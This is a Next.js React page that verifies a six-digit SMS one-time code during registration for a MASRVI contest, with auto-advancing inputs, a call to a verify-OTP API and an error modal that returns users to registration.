import { useState, useEffect } from 'react';
import Head from 'next/head';
import Link from 'next/link';
import Image from 'next/image';
import { useRouter } from 'next/router';
import { useTranslation } from 'react-i18next';
import axios from 'axios';
import ErrorModal from '@/components/ErrorModal';
import { useContest } from '@/context/ContestContext';

export default function OtpPage() {
  const { t } = useTranslation();
  const router = useRouter();
  const { phone, entryCode, clearRegistration } = useContest();
  const [otpCode, setOtpCode] = useState(['', '', '', '', '', '']);
  const [loading, setLoading] = useState(false);
  const [showError, setShowError] = useState(false);
  const [isReady, setIsReady] = useState(false);

  // For testing/preview, use query param or context
  const testPhone = router.query.phone || phone;
  const testEntryCode = router.query.entryCode || entryCode;
  
  useEffect(() => {
    if (router.isReady) {
      setIsReady(true);
      const queryPhone = router.query.phone;
      if (!queryPhone && !phone) {
        router.replace('/register');
      }
    }
  }, [router.isReady, router.query.phone, phone, router]);

  const handleOtpChange = (index, value) => {
    if (value.length > 1) return;
    const newOtp = [...otpCode];
    newOtp[index] = value.replace(/\D/g, '');
    setOtpCode(newOtp);

    // Auto-focus next input
    if (value && index < 5) {
      const nextInput = document.getElementById(`otp-${index + 1}`);
      nextInput?.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !otpCode[index] && index > 0) {
      const prevInput = document.getElementById(`otp-${index - 1}`);
      prevInput?.focus();
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const code = otpCode.join('');
    if (code.length !== 6) return;

    setLoading(true);

    try {
      const { data } = await axios.post('/api/verify-otp', {
        phone,
        entryCode,
        otpCode: code,
      });

      if (data.success) {
        router.push('/share');
      } else {
        setShowError(true);
      }
    } catch {
      setShowError(true);
    } finally {
      setLoading(false);
    }
  };

  const handleErrorClose = () => {
    setShowError(false);
    clearRegistration();
    router.push('/register');
  };

  // Show full phone number
  const displayPhone = testPhone || phone || '';
  const fullPhone = displayPhone ? `+222 ${displayPhone}` : '';

  if (!isReady) return null;
  if (!testPhone && !phone) return null;

  return (
    <>
      <Head>
        <title>MASRVI - {t('otp.title')}</title>
      </Head>

      <main className="min-h-screen flex flex-col bg-gradient-to-br from-primary-50 via-white to-primary-100">
        {/* Back Button */}
        <div className="px-4 py-3 md:py-4">
          <Link
            href="/register"
            className="inline-flex items-center gap-2 text-gray-600 hover:text-primary-700 transition-colors text-sm md:text-base"
          >
            <span className="rtl:rotate-180">&#10094;</span>
            <span>{t('registration.back')}</span>
          </Link>
        </div>

        <div className="flex-1 flex items-center justify-center px-4 py-4 md:py-8">
          <div className="w-full max-w-md">
            <div className="glass-card rounded-2xl md:rounded-3xl p-6 md:p-8">
              {/* Logo */}
              <div className="text-center mb-6">
                <div className="bg-white rounded-2xl p-3 inline-block shadow-sm">
                  <Image
                    src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/5810143423896424381_120-1uDefD1vhhxaUyEWoZbKOogvt8VlOX.jpg"
                    alt="Masrvi Logo"
                    width={120}
                    height={48}
                    className="h-12 w-auto object-contain"
                  />
                </div>
              </div>

              {/* Phone Icon */}
              <div className="text-center mb-6 md:mb-8">
                <div className="w-24 h-24 md:w-28 md:h-28 mx-auto mb-4 md:mb-6 rounded-full bg-[#E8F5E9] flex items-center justify-center relative">
                  <div className="absolute inset-2 rounded-full border-[3px] border-[#4CAF50]/30"></div>
                  <div className="w-16 h-16 md:w-18 md:h-18 rounded-full border-[3px] border-[#4CAF50] flex items-center justify-center bg-white/50">
                    <svg className="w-8 h-8 md:w-9 md:h-9 text-[#4CAF50]" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={1.5}>
                      <rect x="7" y="2" width="10" height="20" rx="2" ry="2" />
                      <line x1="12" y1="18" x2="12" y2="18.01" strokeWidth={2} strokeLinecap="round" />
                    </svg>
                  </div>
                </div>
                <h1 className="text-xl md:text-2xl font-bold text-gray-900 mb-2">{t('otp.title')}</h1>
                <p className="text-gray-600 mb-2 text-sm md:text-base">{t('otp.subtitle')}</p>
                <p className="text-primary-600 font-bold text-lg md:text-xl ltr-input">{fullPhone}</p>
              </div>

              <form onSubmit={handleSubmit} className="space-y-6 md:space-y-8">
                {/* OTP Input Boxes */}
                <div className="flex justify-center gap-2 md:gap-3" dir="ltr">
                  {otpCode.map((digit, index) => (
                    <input
                      key={index}
                      id={`otp-${index}`}
                      type="tel"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleOtpChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      className="w-11 h-14 md:w-14 md:h-16 text-center text-xl md:text-2xl font-bold bg-white border-2 border-gray-200 rounded-2xl focus:outline-none focus:border-primary-400 transition flex items-center justify-center"
                      style={{ textAlign: 'center', lineHeight: '1' }}
                    />
                  ))}
                </div>

                <div className="space-y-3">
                  <button
                    type="submit"
                    disabled={loading || otpCode.join('').length !== 6}
                    className={`w-full py-4 md:py-5 text-white font-bold rounded-2xl transition-all shadow-lg text-base md:text-lg ${
                      otpCode.join('').length === 6
                        ? 'bg-primary-500 hover:bg-primary-600'
                        : 'bg-gray-400 cursor-not-allowed'
                    }`}
                  >
                    {loading ? '...' : t('otp.verify')}
                  </button>

                  <button
                    type="button"
                    onClick={() => router.push('/register')}
                    className="w-full py-4 md:py-5 glass-button text-gray-700 font-bold rounded-2xl hover:bg-white/90 transition-all text-base md:text-lg"
                  >
                    {t('otp.cancel')}
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>
      </main>

      <ErrorModal
        isOpen={showError}
        title={t('errors.title')}
        message={t('errors.invalid_otp')}
        buttonText={t('errors.retry')}
        onClose={handleErrorClose}
      />
    </>
  );
}
